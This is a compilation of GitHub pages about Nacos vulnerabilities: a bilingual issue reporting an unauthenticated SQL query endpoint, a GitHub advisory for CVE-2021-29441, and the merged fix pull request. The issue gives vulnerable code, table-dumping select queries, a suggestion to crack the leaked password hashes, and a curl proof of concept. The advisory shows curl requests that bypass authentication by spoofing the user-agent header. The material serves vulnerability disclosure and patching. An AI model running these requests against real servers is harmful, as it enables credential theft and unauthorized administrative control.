=== Content from github.com_9b5af66c_20250114_223213.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Falibaba%2Fnacos%2Fissues%2F4463)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Falibaba%2Fnacos%2Fissues%2F4463)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=alibaba%2Fnacos)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[alibaba](/alibaba)
/
**[nacos](/alibaba/nacos)**
Public

* [Notifications](/login?return_to=%2Falibaba%2Fnacos) You must be signed in to change notification settings
* [Fork
  12.9k](/login?return_to=%2Falibaba%2Fnacos)
* [Star
   30.7k](/login?return_to=%2Falibaba%2Fnacos)

* [Code](/alibaba/nacos)
* [Issues
  227](/alibaba/nacos/issues)
* [Pull requests
  11](/alibaba/nacos/pulls)
* [Actions](/alibaba/nacos/actions)
* [Projects
  0](/alibaba/nacos/projects)
* [Wiki](/alibaba/nacos/wiki)
* [Security](/alibaba/nacos/security)
* [Insights](/alibaba/nacos/pulse)

Additional navigation options

* [Code](/alibaba/nacos)
* [Issues](/alibaba/nacos/issues)
* [Pull requests](/alibaba/nacos/pulls)
* [Actions](/alibaba/nacos/actions)
* [Projects](/alibaba/nacos/projects)
* [Wiki](/alibaba/nacos/wiki)
* [Security](/alibaba/nacos/security)
* [Insights](/alibaba/nacos/pulse)

# Report a security vulnerability in nacos to execute arbitrary SQL without authentication #4463

[New issue](/login?return_to=)[Jump to bottom](#comment-composer-heading)Copy link[New issue](/login?return_to=)[Jump to bottom](#comment-composer-heading)Copy linkClosed[#4517](https://github.com/alibaba/nacos/pull/4517)Closed[Report a security vulnerability in nacos to execute arbitrary SQL without authentication](#top)#4463[#4517](https://github.com/alibaba/nacos/pull/4517)Copy linkLabels[area/Config](https://github.com/alibaba/nacos/issues?q=state%3Aopen%20label%3A%22area%2FConfig%22)[contribution welcome](https://github.com/alibaba/nacos/issues?q=state%3Aopen%20label%3A%22contribution%20welcome%22)[kind/enhancementCategory issues or prs related to enhancement.](https://github.com/alibaba/nacos/issues?q=state%3Aopen%20label%3A%22kind%2Fenhancement%22)Category issues or prs related to enhancement.Milestone[1.4.1](https://github.com/alibaba/nacos/milestone/23)![@threedr3am](https://avatars.githubusercontent.com/u/19884279?u=8d97a8268b879c86025c4ec4b4e38d0f63177c3b&v=4&size=80)
## Description

![@threedr3am](https://avatars.githubusercontent.com/u/19884279?u=8d97a8268b879c86025c4ec4b4e38d0f63177c3b&v=4&size=48)[threedr3am](https://github.com/threedr3am)opened [on Dec 12, 2020](https://github.com/alibaba/nacos/issues/4463#issue-763383661)

------------------------------------------------------------------------（english）

Hello, I am threedr3am. I found a nacos interface. When nacos is deployed in the default configuration, it can be accessed without authentication and execute arbitrary SQL queries, which leads to the disclosure of sensitive information.

1. Vulnerability details

Source address: <https://github.com/alibaba/nacos>

The audit code can find that there is an interface in the config server, and the SQL statement can be executed without any authentication, and all data can be leaked

The vulnerability lies in the module: com.alibaba.nacos.config.server.controller.ConfigOpsController in nacos-config

```
@GetMapping(value = "/derby")
public RestResult<Object> derbyOps(@RequestParam(value = "sql") String sql) {
    String selectSign = "select";
    String limitSign = "ROWS FETCH NEXT";
    String limit = " OFFSET 0 ROWS FETCH NEXT 1000 ROWS ONLY";
    try {
        if (PropertyUtil.isEmbeddedStorage()) {
            LocalDataSourceServiceImpl dataSourceService = (LocalDataSourceServiceImpl) DynamicDataSource
                    .getInstance().getDataSource();
            if (StringUtils.startsWithIgnoreCase(sql, selectSign)) {
                if (!StringUtils.containsIgnoreCase(sql, limitSign)) {
                    sql += limit;
                }
                JdbcTemplate template = dataSourceService.getJdbcTemplate();
                List<Map<String, Object>> result = template.queryForList(sql);
                return RestResultUtils.success(result);
            }
            return RestResultUtils.failed("Only query statements are allowed to be executed");
        }
        return RestResultUtils.failed("The current storage mode is not Derby");
    } catch (Exception e) {
        return RestResultUtils.failed(e.getMessage());
    }
}

```

As you can see, the code only limits the need to include select, so any select query statement can be executed

Through the test, you can use the following statement to query all database information

```
select * from users

select * from permissions

select * from roles

select * from tenant_info

select * from tenant_capacity

select * from group_capacity

select * from config_tags_relation

select * from app_configdata_relation_pubs

select * from app_configdata_relation_subs

select * from app_list

select * from config_info_aggr

select * from config_info_tag

select * from config_info_beta

select * from his_config_info

select * from config_info

```

The most important thing is that the interface does not require any authentication and can be accessed directly

After reading the account number and the password after the hash, we can analyze it through the open source program source code because of the salt generation algorithm used when nacos creates the account.

Look at the source code com.alibaba.nacos.console.security.nacos.NacosAuthConfig

```
@Override
protected void configure(AuthenticationManagerBuilder auth) throws Exception {
    auth.userDetailsService(userDetailsService).passwordEncoder(passwordEncoder());
}

@Override
protected void configure(HttpSecurity http) throws Exception {

    if (StringUtils.isBlank(authConfigs.getNacosAuthSystemType())) {
        http

                .csrf().disable().cors() // We don't need CSRF for JWT based authentication

                .and().sessionManagement().sessionCreationPolicy(SessionCreationPolicy.STATELESS)

                .and().authorizeRequests().requestMatchers(CorsUtils::isPreFlightRequest).permitAll()
                .antMatchers(LOGIN_ENTRY_POINT).permitAll()

                .and().authorizeRequests().antMatchers(TOKEN_BASED_AUTH_ENTRY_POINT).authenticated()

                .and().exceptionHandling().authenticationEntryPoint(new JwtAuthenticationEntryPoint());

        // disable cache
        http.headers().cacheControl();

        http.addFilterBefore(new JwtAuthenticationTokenFilter(tokenProvider),
                UsernamePasswordAuthenticationFilter.class);
    }
}

@Bean
public PasswordEncoder passwordEncoder() {
    return new BCryptPasswordEncoder();
}

```

As you can see, they are all default and users cannot modify them

Therefore, refer to the tool class com.alibaba.nacos.console.utils.PasswordEncoderUtil

In this way, the password represented by the hash value can be quickly blasted locally

```

package com.alibaba.nacos.console.utils;

import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;

/**
 * Password encoder tool.
 *
 * @author nacos
 */
public class PasswordEncoderUtil {

    public static void main(String[] args) {
        System.out.println(new BCryptPasswordEncoder().encode("nacos"));
    }

    public static Boolean matches(String raw, String encoded) {
        return new BCryptPasswordEncoder().matches(raw, encoded);
    }

    public static String encode(String raw) {
        return new BCryptPasswordEncoder().encode(raw);
    }
}

```

2. the loopholes reproduce

Deployment process:

1. Go to github to download the latest release: <https://github.com/alibaba/nacos/releases>
2. Execute ./bin/startup.sh -m standalone to run locally

poc：

```
curl -XGET 'http://127.0.0.1:8848/nacos/v1/cs/ops/derby?sql=select%20*%20from%20users%20'

```

3. Scope of influence

All versions

------------------------------------------------------------------------（中文）

你好，我是threedr3am，我发现了一个nacos的接口，在默认配置部署nacos的情况下，它无需认证即可被访问，并执行任意sql查询，导致敏感信息泄露。

一、漏洞详情

源码地址：<https://github.com/alibaba/nacos>

审计代码可以发现，config server中有个接口，没有做任何的鉴权，即可执行sql语句，可以泄漏全部数据

漏洞点在于module：nacos-config的com.alibaba.nacos.config.server.controller.ConfigOpsController中

```
@GetMapping(value = "/derby")
public RestResult<Object> derbyOps(@RequestParam(value = "sql") String sql) {
    String selectSign = "select";
    String limitSign = "ROWS FETCH NEXT";
    String limit = " OFFSET 0 ROWS FETCH NEXT 1000 ROWS ONLY";
    try {
        if (PropertyUtil.isEmbeddedStorage()) {
            LocalDataSourceServiceImpl dataSourceService = (LocalDataSourceServiceImpl) DynamicDataSource
                    .getInstance().getDataSource();
            if (StringUtils.startsWithIgnoreCase(sql, selectSign)) {
                if (!StringUtils.containsIgnoreCase(sql, limitSign)) {
                    sql += limit;
                }
                JdbcTemplate template = dataSourceService.getJdbcTemplate();
                List<Map<String, Object>> result = template.queryForList(sql);
                return RestResultUtils.success(result);
            }
            return RestResultUtils.failed("Only query statements are allowed to be executed");
        }
        return RestResultUtils.failed("The current storage mode is not Derby");
    } catch (Exception e) {
        return RestResultUtils.failed(e.getMessage());
    }
}

```

可以看到，代码只限制了需要包含select，因此，导致可以执行任意的select查询语句

通过测试，可以用以下的语句查询到所有数据库信息

```
select * from users

select * from permissions

select * from roles

select * from tenant_info

select * from tenant_capacity

select * from group_capacity

select * from config_tags_relation

select * from app_configdata_relation_pubs

select * from app_configdata_relation_subs

select * from app_list

select * from config_info_aggr

select * from config_info_tag

select * from config_info_beta

select * from his_config_info

select * from config_info

```

最重要的是，该接口不需要任何认证，直接就可以访问

通过读取到账号以及hash之后的密码后，因为nacos创建账号时使用的salt生成算法我们通过开源的程序源码已经能分析出来

看源码com.alibaba.nacos.console.security.nacos.NacosAuthConfig

```
@Override
protected void configure(AuthenticationManagerBuilder auth) throws Exception {
    auth.userDetailsService(userDetailsService).passwordEncoder(passwordEncoder());
}

@Override
protected void configure(HttpSecurity http) throws Exception {

    if (StringUtils.isBlank(authConfigs.getNacosAuthSystemType())) {
        http

                .csrf().disable().cors() // We don't need CSRF for JWT based authentication

                .and().sessionManagement().sessionCreationPolicy(SessionCreationPolicy.STATELESS)

                .and().authorizeRequests().requestMatchers(CorsUtils::isPreFlightRequest).permitAll()
                .antMatchers(LOGIN_ENTRY_POINT).permitAll()

                .and().authorizeRequests().antMatchers(TOKEN_BASED_AUTH_ENTRY_POINT).authenticated()

                .and().exceptionHandling().authenticationEntryPoint(new JwtAuthenticationEntryPoint());

        // disable cache
        http.headers().cacheControl();

        http.addFilterBefore(new JwtAuthenticationTokenFilter(tokenProvider),
                UsernamePasswordAuthenticationFilter.class);
    }
}

@Bean
public PasswordEncoder passwordEncoder() {
    return new BCryptPasswordEncoder();
}

```

可以看到，都是默认的，使用者没法做修改

因此，参考工具类com.alibaba.nacos.console.utils.PasswordEncoderUtil

通过这样的方式，可以在本地快速的爆破出hash值表示的密码

```

package com.alibaba.nacos.console.utils;

import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;

/**
 * Password encoder tool.
 *
 * @author nacos
 */
public class PasswordEncoderUtil {

    public static void main(String[] args) {
        System.out.println(new BCryptPasswordEncoder().encode("nacos"));
    }

    public static Boolean matches(String raw, String encoded) {
        return new BCryptPasswordEncoder().matches(raw, encoded);
    }

    public static String encode(String raw) {
        return new BCryptPasswordEncoder().encode(raw);
    }
}

```

二、漏洞复现

部署流程：

1. 到github下载最新版release：<https://github.com/alibaba/nacos/releases>
2. 执行./bin/startup.sh -m standalone本地运行

poc：

```
curl -XGET 'http://127.0.0.1:8848/nacos/v1/cs/ops/derby?sql=select%20*%20from%20users%20'

```

三、影响范围

所有版本

## Metadata

### Assignees

No one assigned

### Labels

[area/Config](https://github.com/alibaba/nacos/issues?q=state%3Aopen%20label%3A%22area%2FConfig%22)[contribution welcome](https://github.com/alibaba/nacos/issues?q=state%3Aopen%20label%3A%22contribution%20welcome%22)[kind/enhancementCategory issues or prs related to enhancement.](https://github.com/alibaba/nacos/issues?q=state%3Aopen%20label%3A%22kind%2Fenhancement%22)Category issues or prs related to enhancement.
### Type

No type
### Projects

No projects
### Milestone

* [1.4.1](https://github.com/alibaba/nacos/milestone/23)
### Relationships

None yet
### Development

No branches or pull requests
## Issue actions

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_7afd02d5_20250114_223211.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fadvisories%2FGHSA-36hp-jr8h-556f)

**CVE-2021-29441**

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fadvisories%2FGHSA-36hp-jr8h-556f)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2Fadvisories%2F%3Cid%3E&source=header)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

1. [GitHub Advisory Database](/advisories)
2. [GitHub Reviewed](/advisories?query=type%3Areviewed)
3. [CVE-2021-29441](/advisories/GHSA-36hp-jr8h-556f)

## Authentication Bypass

High severity

GitHub Reviewed

Published
Apr 27, 2021
to the GitHub Advisory Database
•
Updated Feb 1, 2023

[Vulnerability details](/advisories/GHSA-36hp-jr8h-556f)
[Dependabot alerts
0](/advisories/GHSA-36hp-jr8h-556f/dependabot)

## Package

maven

com.alibaba.nacos:nacos-common
([Maven](/advisories?query=ecosystem%3Amaven))

## Affected versions

< 1.4.1

## Patched versions

1.4.1

## Description

When configured to use authentication (`-Dnacos.core.auth.enabled=true`) Nacos uses the `AuthFilter` servlet filter to enforce authentication. This filter has a [backdoor](https://github.com/alibaba/nacos/blob/5fa05aef52f7432aeab19fe53035431b9d8c91d9/core/src/main/java/com/alibaba/nacos/core/auth/AuthFilter.java#L78-L81) that enables Nacos servers to bypass this filter and therefore skip authentication checks. This mechanism relies on the `user-agent` HTTP header so it can be easily spoofed.

The following request to the `configuration` endpoint gets rejected as we are not providing any credentials:

```
❯ curl -X POST "http://127.0.0.1:8848/nacos/v1/cs/configs?dataId=nacos.cfg.dataIdfoo&group=foo&content=helloWorld"
{"timestamp":"2020-12-02T14:33:57.154+0000","status":403,"error":"Forbidden","message":"unknown user!","path":"/nacos/v1/cs/configs"}

```

However the following one gets accepted by using the `Nacos-Server` user-agent header:

```
❯ curl -X POST -A Nacos-Server "http://127.0.0.1:8848/nacos/v1/cs/configs?dataId=nacos.cfg.dataIdfoo&group=foo&content=helloWorld"
true

```
#### Impact

This issue may allow any user to carry out any administrative tasks on the Nacos server.

### References

* <https://nvd.nist.gov/vuln/detail/CVE-2021-29441>
* [alibaba/nacos#4701](https://github.com/alibaba/nacos/issues/4701)
* [alibaba/nacos#4703](https://github.com/alibaba/nacos/pull/4703)
* [GHSA-36hp-jr8h-556f](https://github.com/advisories/GHSA-36hp-jr8h-556f "GHSA-36hp-jr8h-556f")

Reviewed
Apr 27, 2021

Published to the GitHub Advisory Database
Apr 27, 2021

Published by the [National Vulnerability Database](https://nvd.nist.gov/vuln/detail/CVE-2021-29441)
Apr 27, 2021

Last updated
Feb 1, 2023

### Severity

High

### [EPSS score](https://www.first.org/epss/user-guide)

96.743%
 (100th percentile)

### Weaknesses

[CWE-290](/advisories?query=cwe%3A290)

### CVE ID

CVE-2021-29441

### GHSA ID

GHSA-36hp-jr8h-556f

### Source code

No known source code

 Loading

Checking history

See something to contribute?
[Suggest improvements for this vulnerability](/advisories/GHSA-36hp-jr8h-556f/improve).

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_13e82c51_20250114_223215.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Falibaba%2Fnacos%2Fpull%2F4517)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Falibaba%2Fnacos%2Fpull%2F4517)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fpull_requests_fragments%2Fpull_request_layout&source=header-repo&source_repo=alibaba%2Fnacos)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[alibaba](/alibaba)
/
**[nacos](/alibaba/nacos)**
Public

* [Notifications](/login?return_to=%2Falibaba%2Fnacos) You must be signed in to change notification settings
* [Fork
  12.9k](/login?return_to=%2Falibaba%2Fnacos)
* [Star
   30.7k](/login?return_to=%2Falibaba%2Fnacos)

* [Code](/alibaba/nacos)
* [Issues
  227](/alibaba/nacos/issues)
* [Pull requests
  11](/alibaba/nacos/pulls)
* [Actions](/alibaba/nacos/actions)
* [Projects
  0](/alibaba/nacos/projects)
* [Wiki](/alibaba/nacos/wiki)
* [Security](/alibaba/nacos/security)
* [Insights](/alibaba/nacos/pulse)

Additional navigation options

* [Code](/alibaba/nacos)
* [Issues](/alibaba/nacos/issues)
* [Pull requests](/alibaba/nacos/pulls)
* [Actions](/alibaba/nacos/actions)
* [Projects](/alibaba/nacos/projects)
* [Wiki](/alibaba/nacos/wiki)
* [Security](/alibaba/nacos/security)
* [Insights](/alibaba/nacos/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Falibaba%2Fnacos%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Falibaba%2Fnacos%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# [ISSUE #4463] fix derbyOps interface security problem #4517

 Merged

[KomachiSion](/KomachiSion)
merged 1 commit into
[alibaba:develop](/alibaba/nacos/tree/develop "alibaba/nacos:develop")
from
[haoyann:fix-4463](/haoyann/nacos/tree/fix-4463 "haoyann/nacos:fix-4463")

Dec 21, 2020

 Merged

# [[ISSUE #4463] fix derbyOps interface security problem](#top) #4517

[KomachiSion](/KomachiSion)
merged 1 commit into
[alibaba:develop](/alibaba/nacos/tree/develop "alibaba/nacos:develop")
from
[haoyann:fix-4463](/haoyann/nacos/tree/fix-4463 "haoyann/nacos:fix-4463")

Dec 21, 2020

[Conversation
0](/alibaba/nacos/pull/4517)
[Commits
1](/alibaba/nacos/pull/4517/commits)
[Checks
0](/alibaba/nacos/pull/4517/checks)
[Files changed](/alibaba/nacos/pull/4517/files)

## Conversation

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

[![haoyann](https://avatars.githubusercontent.com/u/43994656?s=60&v=4)](/haoyann)

Copy link

Collaborator

### @haoyann **[haoyann](/haoyann)** commented [Dec 18, 2020](#issue-770583109)

Please do not create a Pull Request without creating an issue first.

## What is the purpose of the change

fix [#4463](https://github.com/alibaba/nacos/issues/4463)

## Brief changelog

XX

## Verifying this change

XXXX

Follow this checklist to help us incorporate your contribution quickly and easily:

* Make sure there is a Github issue filed for the change (usually before you start working on it). Trivial changes like typos do not require a Github issue. Your pull request should address just this issue, without pulling in other changes - one PR resolves one issue.
* Format the pull request title like `[ISSUE #123] Fix UnknownException when host config not exist`. Each commit in the pull request should have a meaningful subject line and body.
* Write a pull request description that is detailed enough to understand what the pull request does, how, and why.
* Write necessary unit-test to verify your logic correction, more mock a little better when cross module dependency exist. If the new feature or significant change is committed, please remember to add integration-test in [test module](https://github.com/alibaba/nacos/tree/master/test).
* Run `mvn -B clean package apache-rat:check findbugs:findbugs -Dmaven.test.skip=true` to make sure basic checks pass. Run `mvn clean install -DskipITs` to make sure unit-test pass. Run `mvn clean test-compile failsafe:integration-test` to make sure integration-test pass.

Sorry, something went wrong.

All reactions

[![@haoyann](https://avatars.githubusercontent.com/u/43994656?s=40&v=4)](/haoyann)

`[fix derbyOps interface security problem](/alibaba/nacos/pull/4517/commits/bffd440297618d189a7c8cac26191147d763cc6f "fix derbyOps interface security problem")`

`[bffd440](/alibaba/nacos/pull/4517/commits/bffd440297618d189a7c8cac26191147d763cc6f)`

[![KomachiSion](https://avatars.githubusercontent.com/u/37170243?s=60&v=4)](/KomachiSion)

**[KomachiSion](/KomachiSion)**
approved these changes
[Dec 21, 2020](#pullrequestreview-556091130)

 [View reviewed changes](/alibaba/nacos/pull/4517/files/bffd440297618d189a7c8cac26191147d763cc6f)

[![@KomachiSion](https://avatars.githubusercontent.com/u/37170243?s=40&u=fb1941bda29c47909e47a27e3a1165f963116f83&v=4)](/KomachiSion)
[KomachiSion](/KomachiSion)
added
[kind/enhancement](/alibaba/nacos/labels/kind/enhancement)
Category issues or prs related to enhancement.
[area/Config](/alibaba/nacos/labels/area/Config)
labels
[Dec 21, 2020](#event-4133963244)

[![@KomachiSion](https://avatars.githubusercontent.com/u/37170243?s=40&u=fb1941bda29c47909e47a27e3a1165f963116f83&v=4)](/KomachiSion)
[KomachiSion](/KomachiSion)
added this to the [1.4.1](/alibaba/nacos/milestone/23) milestone
[Dec 21, 2020](#event-4133963432)

[![@KomachiSion](https://avatars.githubusercontent.com/u/37170243?s=40&u=fb1941bda29c47909e47a27e3a1165f963116f83&v=4)](/KomachiSion)
[KomachiSion](/KomachiSion)
merged commit [`1bc350b`](/alibaba/nacos/commit/1bc350b99a7d61c394f73fbf8844bda8fc49e0a7)
into
alibaba:develop

[Dec 21, 2020](https://github.com/alibaba/nacos/pull/4517#event-4133963548)

